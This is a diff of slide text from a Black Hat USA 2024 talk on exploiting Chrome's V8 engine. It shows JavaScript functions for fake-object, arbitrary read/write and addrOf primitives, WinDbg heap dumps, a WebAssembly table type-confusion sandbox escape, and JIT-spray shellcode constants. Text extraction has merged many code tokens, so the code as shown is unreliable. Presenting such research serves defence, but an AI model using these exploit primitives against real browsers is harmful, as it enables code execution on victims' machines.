@@ -2585,51 +2579,51 @@ String.fromCharCode.apply(null,
 
 ### From Out of Bounds Read to FakeObj
 
-```
+\```
 //read the arbitrary offset of object2 in the ASM level
 ; fakeobj= [object2+arbitrary_offset+0xB]
 moveax, dwordptr[r8+r11*2+0Bh]
 addrax, r14
-```
+\```
 
-```
+\```
 Object2_addr
-```
+\```
 
-```
+\```
 Object2
-```
+\```
 
-```
+\```
 The V8 Heap manipulations:
-```
+\```
 
 - `Write the arbitrary value at a relative address (of a known object)`
 
-```
+\```
 Object2_addr +
 offset+ 0xB
-```
+\```
 
-```
+\```
 Fake_object_
 addr
-```
+\```
 
 - `Write the arbitrary value at a fixed address`
 
-```
+\```
 Fake_object_addr
-```
+\```
 
-```
+\```
 Fake_object
-```
+\```
 
-```
+\```
 // fake the arbitrary object in the JS level
 fakeobj= object2[arbitrary_index];
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2639,16 +2633,16 @@ fakeobj= object2[arbitrary_index];
 
 ### Write the Arbitrary Value at a Fixed Address
 
-```
+\```
 letlarge_arr= newArray(0x400000);
 large_arr.fill(1.1);
-```
+\```
 
-```
+\```
 large_arr[0]=1.2;
-```
+\```
 
-```
+\```
 Large Array0:000> dd (0x02f10018287d-1)
 02f10018287c: 00116db1 000006f5
 Map
@@ -2665,11 +2659,11 @@ Length
 Data9999999a 3ff19999
 …
 33333333 3ff33333
-```
+\```
 
-```
+\```
 Large Array Elements address is fixed per array size and Chrome Version!
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2714,41 +2708,41 @@ address spray 00000000 00000000
 
 Object2_addr
 
-```
+\```
 Object2
-```
+\```
 
-```
+\```
 Object2_addr +
 offset+ 0xb
-```
+\```
 
-```
+\```
 Fake_object_
 addr
-```
+\```
 
-```
+\```
 Fake_object_addr
-```
+\```
 
-```
+\```
 Fake_object
-```
+\```
 
-```
+\```
 The theory
-```
+\```
 
-```
+\```
 Object2_addr
-```
+\```
 
-```
+\```
 Object2
-```
+\```
 
-```
+\```
 Large_arr_elem_addr:
 0x01402139
 Large Array
@@ -2762,17 +2756,17 @@ fakeobj
 address
 spray:
 0x01402141
-```
+\```
 
-```
+\```
 The practice
-```
+\```
 
-```
+\```
 JavascriptLevel
-```
+\```
 
-```
+\```
 //read and write
 with fakeobj
 f = fakeobj[0];
@@ -2781,7 +2775,7 @@ fakeobj[0] = obj;
 with large array
 a = large_arr[i];
 large_arr[i] = c;
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2791,14 +2785,14 @@ large_arr[i] = c;
 
 ### Fake the Object – Object Map Values
 
-```
+\```
 PACKED_DOUBLE_ELEMENTS
-```
+\```
 
-```
+\```
 letl= [1.1, 1.2, 1.3, 1.4];
 leta= [1, 2, 3, 1.2, 'x'];
-```
+\```
 
 0.000>  dd (0x01a600188375-1)
 01a600188374:  00116d71 000006f5
@@ -2813,9 +2807,9 @@ Length
 01a600188384:  00116df1 000006f5
 00146b11 0000000a
 
-```
+\```
 Map Values are Fixed per Chrome Version!
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2825,13 +2819,13 @@ Map Values are Fixed per Chrome Version!
 
 ### Fake the Object – More Details
 
-```
+\```
 large_arr[0] = BigIntAsDouble(FAKE_OBJ_MAP|(0x6f5<<32n));
 large_arr[1] = BigIntAsDouble(FAKE_OBJ_ELEMENTS_ADDR|(smi(1n)<<32n));
 large_arr[2] = BigIntAsDouble(FIXED_ARRAY_MAP|(smi(0n) << 32n));
-```
+\```
 
-```
+\```
 Large Array Elements
 Map
 Length
@@ -2845,9 +2839,9 @@ Fake_Obj_Map
 Fake_Obj_Length
 Data
 …
-```
+\```
 
-```
+\```
 0.000> dd (0x029001402139-1)
 029001402138: 00000879 00800000
 00116d71000006f5 -> la[0]
@@ -2860,7 +2854,7 @@ Data
 029003402158: 01402141 01402141
 %DebugPrint(fakeobj);
 0x029001402141<JSArray[1]>
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2870,7 +2864,7 @@ Data
 
 ### From FakeObj to Exploitation Primitives: Arbitrary Read
 
-```
+\```
 functionv8_read64(addr) {
 addr|= 1n;
 addr-= FIXED_ARRAY_HEADER_SIZE;
@@ -2880,9 +2874,9 @@ letresult= DoubleAsBigInt(fakeobj[0]);
 large_arr[1] = BigIntAsDouble(0n| (smi(0n) << 32n));
 returnresult;
 }
-```
+\```
 
-```
+\```
 Large Array Elements
 Map
 Length
@@ -2893,7 +2887,7 @@ DEFAULT_JS_ARRAY_PRO
 PERTIES
 Arbitray_Addr|1 –8
 Obj_Length-smi(1n)
-```
+\```
 
 Arbitrary
 Address
@@ -2901,18 +2895,18 @@ Address
 fakeobj[0 ]
 …
 
-```
+\```
 0.000> dd (0x029001402139-1)
 029001402138: 00000879 00040000
 00116d71000006f5 -> la[0]
 029001402148: 1234567100000002 -> la[1]
-```
+\```
 
-```
+\```
 v8_read64(0x12345678) -> 0xdeadbeefdeadbeef
 0.000> dd 0x029012345678
 029012345678: deadbeefdeadbeef-> fakeobj[0]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2922,7 +2916,7 @@ v8_read64(0x12345678) -> 0xdeadbeefdeadbeef
 
 ### From FakeObj to Exploitation Primitives: Arbitrary Write
 
-```
+\```
 functionv8_write(bit, addr, val) {
 addr|= 1n;
 addr-= FIXED_ARRAY_HEADER_SIZE;
@@ -2932,13 +2926,13 @@ if(bit==64) fake[0] = BigIntAsDouble(val);
 if(bit==32) { letoriginal= read64(addr); fake[0] = BigIntAsDouble(val| (original[1] << 32n)); }
 large_arr[1] = BigIntAsDouble(0n| (smi(0n) << 32n));
 }
-```
+\```
 
-```
+\```
 fakeobj
-```
+\```
 
-```
+\```
 Large Array Elements
 Map
 Length
@@ -2950,30 +2944,30 @@ DEFAULT_JS_ARRAY_PRO…
 fakeobj[0]
 …
 PERTIES
-```
+\```
 
-```
+\```
 DEFAULT_JS_ARRAY_PRO
 PERTIES
 Arbitray_Addr|1 –8
 Obj_Length-smi(1n)
-```
+\```
 
-```
+\```
 0.000> dd (0x029001402139-1)
 029001402138: 00000879 00040000
 00116d71000006f5 -> la[0]
 029001402148: 1234567100000002 -> la[1]
-```
+\```
 
-```
+\```
 v8_write(32, 0x12345678, 0x13371337)
 0.000> dd 0x029012345678
 029012345678: 13371337 deadbeef-> fakeobj[0]
 v8_write(64, 0x12345678, 0x1337133713371337)
 0.000> dd 0x029012345678
 029012345678: 13371337 13371337 -> fakeobj[0]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2983,23 +2977,23 @@ v8_write(64, 0x12345678, 0x1337133713371337)
 
 ### From FakeObj to Exploitation Primitives: Addrof
 
-```
+\```
 functionaddrOf(obj) {
-```
+\```
 
-```
+\```
 large_arr[0] = BigIntAsDouble(PACKED_ELEMENTS_MAP| (DEFAULT_JS_ARRAY_PROPERTIES<< 32n));
 large_arr[1] = BigIntAsDouble(FAKE_JS_ARRAY_ELEMENTS_ADDR| (smi(1n) << 32n));
 fake[0] = obj;
-```
+\```
 
-```
+\```
 letaddr= DoubleAsBigInt(large_arr[3]) | (smi(0n) << 32n);
 returnaddr;
 }
-```
+\```
 
-```
+\```
 Large Array Elements0.000> dd (0x029001402139-1)
 Map029001402138: 00000879 00800000
 00116df1000006f5 -> la[0]
@@ -3018,7 +3012,7 @@ Fake_Obj_Map
 Fake_Obj_LengthaddrOf(obj) -> 0x001582e5
 obj
 Fakeobj[0]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3089,7 +3083,7 @@ Fakeobj[0]
 
 ##### Stability: Find the Index for 3 Possible Large Array Element Addresses
 
-```
+\```
 functionfind_index() {
 letindex= -1;
 fakeobj[0] = 1.1;0.000> dd (0x029001402139-1)
@@ -3108,7 +3102,7 @@ break;
 }
 returnindex;
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3118,19 +3112,19 @@ returnindex;
 
 ## Stability: Scavenger vs MinorMS
 
-```
+\```
 Scavenger: V8 current default young generation
 garbage collector
-```
+\```
 
-```
+\```
 MinorMS: aka Minor Mark-Sweep, the new V8
 young generation garbage collector
-```
+\```
 
-```
+\```
 Free_Chunk_Base
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3164,10 +3158,10 @@ Free_Chunk_Base
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Nal
 blackhat © = “9 |
 USA 2024
 Let the WebAssembly
@@ -3233,17 +3227,6 @@ Object Object Object
 # Let the WebAssembly Assemble: The WASM Internals
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-| 4a
-blackhat  _—
-USA 2024
-Let the WebAssembly
-Assemble:
-The WASM Internals
-```
 
 ## Slide 71
 
@@ -3371,7 +3354,7 @@ f32.const 0.015
 
 ### WASM Basics – Table and Indirect Call
 
-```
+\```
 consttbl= new WebAssembly.Table({(module
 initial: 1,(type $whatever(func(result f32)))
 element: "anyfunc",(import "env" "tbl" (table $tb1 funcref))
@@ -3390,7 +3373,7 @@ letwasm_instance_1 = new
 WebAssembly.Instance(wasm_mod_1, importObject);
 tbl.set(0, indirect);
 wasm_instance_1.exports.main(1000); //15
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3449,13 +3432,13 @@ Vector<WasmFunction>
 
 ### WASM Basics – Table and Indirect Call
 
-```
+\```
 …
 tbl.set(0, indirect);
 wasm_instance_1.exports.main(1000); //15
-```
+\```
 
-```
+\```
 voidWasmTableObject::SetFunctionTableEntry(Isolate* isolate,
 Handle<WasmTableObject> table,
 intentry_index,
@@ -3468,23 +3451,23 @@ autoexported_function= Handle<WasmExportedFunction>::cast(external);
 Handle<WasmTrustedInstanceData> target_instance_data(
 exported_function->instance()->trusted_data(isolate), isolate);
 int func_index= exported_function->function_index();
-```
+\```
 
-```
+\```
 auto* wasm_function=
 &target_instance_data->module()->functions[func_index];
 UpdateDispatchTables(isolate, table, entry_index, wasm_function,
 target_instance_data);
 }
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3496,74 +3479,74 @@ target_instance_data);
 
 ###### **`WasmInstanceObject`**
 
-```
+\```
 Map
 Trusted PtrTable
 Index
 WasmModuleObject
-```
+\```
 
-```
+\```
 Trusted
 Pointer Table
 0Type+Pointer
 1Type+Pointer
-```
+\```
 
-```
+\```
 WasmTrustedInstanceData
 Map
-```
+\```
 
-```
+\```
 voidWasmTableObject::UpdateDispatchTables(
-```
+\```
 
-```
+\```
 Isolate* isolate, Handle<WasmTableObject> table, intentry_index,
 constwasm::WasmFunction* func,
-```
+\```
 
-```
+\```
 Handle<WasmTrustedInstanceData> target_instance_data) {
-```
+\```
 
-```
+\```
 ...
 Address call_target= target_instance_data->GetCallTarget(func->func_index);
 ...
-```
+\```
 
-```
+\```
 for(inti= 0, len= uses->length(); i< len; i+= TableUses::kNumElements) {
 inttable_index= Smi::cast(uses->get(i+ TableUses::kIndexOffset)).value();
 Handle<WasmInstanceObject> instance_object= handle(
 WasmInstanceObject::cast(uses->get(i+ TableUses::kInstanceOffset)),
 isolate);
-```
+\```
 
-```
+\```
 ...
 Tagged<WasmTrustedInstanceData> instance_data=
 instance_object->trusted_data(isolate);
-```
+\```
 
-```
+\```
 …
-```
+\```
 
-```
+\```
 wasm_dispatch_table
 jump_table_start
 …
-```
+\```
 
-```
+\```
 instance_data->dispatch_table(table_index)
 ->Set(entry_index, *call_ref, call_target, sig_id);
 }
 }
-```
+\```
 
 … `dispatch_table` call_target `Index` 0 …
 
@@ -3577,11 +3560,11 @@ instance_data->dispatch_table(table_index)
 
 `Address WasmTrustedInstanceData::GetCallTarget` Control of `(` **WASM Instance 0 RWX Memory** `uint32_t func_index` callTarget `) {` 0x3e4058452000 jmp 0x3e4058452840 `wasm::NativeModule* native_module =` 0x3e4058452005 0x0000000000 Main Jump `module_object()->native_module();` Table `…` 0x3e405845200a 0x0000000000 `return jump_table_start() +` … … 0x3e4058452040 jmp qword ptr[rip+0x2] `JumpTableOffset( native_module->module(), func_index` … … `);` 0x3e4058452048 0x7ffff3d23780 Far Jump `}` … … Table 0x3e4058452050 jmp qword ptr[rip+0x2] … … `uint32_t JumpSlotIndexToOffset(uint32_t slot_index) { uint32_t line_index = slot_index /` 0x3e4058452050 0x7ffff3d23c00 `kJumpTableSlotsPerLine;` … … `uint32_t line_offset =` 0x3e4058452840 push rbp `(slot_index % kJumpTableSlotsPerLine) *` 0x3e4058452841 mov rbp,rsp Compiled `kJumpTableSlotSize;` 0x3e4058452844 push 0x8 code 0x3e4058452846 push rsi `return line_index * kJumpTableLineSizekJumpTableLineSize + line_offset;` 0x3e4058452847 sub rsp,0x10 … …
 
-```
+\```
 returnline_index* kJumpTableLineSizekJumpTableLineSize+
 line_offset;
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3655,55 +3638,55 @@ code
 
 ###### WASM Module 1
 
-```
+\```
 (module
 (func$indirect (result f32)
 f32.const0.015
 )
 (export "indirect" (func$indirect))
 )
-```
+\```
 
 ###### WASM Module 2
 
-```
+\```
 (module
 (func(export "f0") nop)
 (func(export "f1") nop)
 (func(export "f2") nop)
 (func(export "f3") nop)
-```
+\```
 
-```
+\```
 (module
-```
+\```
 
-```
+\```
 (type $whatever(func(result f32)))
 (import "env" "tbl" (table $tb1 funcref))
 (func$exploit(param $parametref32) (result f32)
 (f32.mul
-```
+\```
 
-```
+\```
 (call_indirect(type $whatever) (i32.const0))
 (local.get$parametre)
 )
 )
 (export ”exploit" (func$exploit))
 )
-```
+\```
 
-```
+\```
 …
 (func(export "fN") (result f32)
 f32.const0.015
 )
-```
+\```
 
-```
+\```
 )
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3836,36 +3819,36 @@ wasm_dispatch_table
 
 ### V8 Sandbox Escape
 
-```
+\```
 …
-```
+\```
 
-```
+\```
 tbl.set(0, indirect);
-```
+\```
 
-```
+\```
 voidWasmTableObject::SetFunctionTableEntry(Isolate* isolate,
 Handle<WasmTableObject> table,
 intentry_index,
 Handle<Object> entry) {
-```
+\```
 
-```
+\```
 wasm_instance_1.exports.exploit(1337);
-```
+\```
 
-```
+\```
 func_index= N
 Instance data
 of Instance 0
-```
+\```
 
-```
+\```
 module2->functions[N]
-```
+\```
 
-```
+\```
 ...
 Handle<Object> external = WasmInternalFunction::GetOrCreateExternal(
 handle(WasmFuncRef::cast(*entry)->internal(isolate), isolate));
@@ -3881,7 +3864,7 @@ target_instance_data);
 }
 ...
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -3891,39 +3874,39 @@ target_instance_data);
 
 ###### WASM Internals – Table and Indirect Call
 
-```
+\```
 voidWasmTableObject::UpdateDispatchTables(
-```
+\```
 
-```
+\```
 Instance data
 of Instance 0
-```
+\```
 
-```
+\```
 func= confused
 wasmfunction
 from module 2
-```
+\```
 
-```
+\```
 Isolate* isolate, Handle<WasmTableObject> table, intentry_index,
 constwasm::WasmFunction* func,
 Handle<WasmTrustedInstanceData> target_instance_data) {
 ...
 Address call_target= target_instance_data->GetCallTarget(func->func_index);
 ...
-```
+\```
 
-```
+\```
 for(inti= 0, len= uses->length(); i< len; i+= TableUses::kNumElements) {
 inttable_index= Smi::cast(uses->get(i+ TableUses::kIndexOffset)).value();
 Handle<WasmInstanceObject> instance_object= handle(
 WasmInstanceObject::cast(uses->get(i+ TableUses::kInstanceOffset)),
 isolate);
-```
+\```
 
-```
+\```
 ...
 Tagged<WasmTrustedInstanceData> instance_data=
 instance_object->trusted_data(isolate);
@@ -3931,7 +3914,7 @@ instance_data->dispatch_table(table_index)
 ->Set(entry_index, *call_ref, call_target, sig_id);
 }
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -4064,7 +4047,7 @@ Code Execution
 
 64bit ASM
 
-```
+\```
 (func(export "spray") (result f64)
 f64.const1.63052427775809e-270
 f64.const1.6181477236817195e-270
@@ -4072,13 +4055,13 @@ f64.const1.6177848829038078e-270
 f64.const1.630523884017562e-270
 …
 )
-```
+\```
 
 Liftoff
 …
 Compiler
 
-```
+\```
 …
 movabsr10,0x7eb909090909090
 vmovqxmm0,r10
@@ -4089,7 +4072,7 @@ vmovqxmm2,r10
 movabsr10,0x7eb909020e3c148
 vmovqxmm3,r
 …
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -4174,9 +4157,9 @@ xmm2,r10
 
 ###### **WASM Instance 0 RWX Memory**
 
-```
+\```
 …
-```
+\```
 
 tbl.set(0, indirect); 0x3e4058452000 jmp 0x3e4058452840
 Main Jump
@@ -4261,44 +4244,35 @@ code
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Tia! se
-black hat —
-USA 2024
-Q&A
-```
-
 ## Slide 102
 
 ### References
 
-```
+\```
 [1] OffensiveCon24 -Samuel Groß-The V8 Heap Sandbox
 https://youtu.be/5otAw81AHQ0?si=fFzTt8W4lSNggAC4
-```
+\```
 
-```
+\```
 [2] Fast For-In in V8 -Camillo Brunihttps://v8.dev/blog/fast-for-in
 [3] Maps (Hidden Classes) in V8https://v8.dev/docs/hidden-classes
 [4] CVE-2023-4427 -Sergei Glazunovhttps://bugs.chromium.org/p/project-
 zero/issues/detail?id=2477
-```
+\```
 
-```
+\```
 [5] Patch CVE-2023-4427:
-```
+\```
 
-```
+\```
 https://chromium-review.googlesource.com/c/v8/v8/+/4771019
 [6] Patch CVE-2023-3159:
-```
+\```
 
-```
+\```
 https://chromium-review.googlesource.com/c/v8/v8/+/5388435/3/src/objects/map-
 updater.cc#b1051
-```
+\```
 
 - `[7] Patch V8 Sandbox Escape:`
 
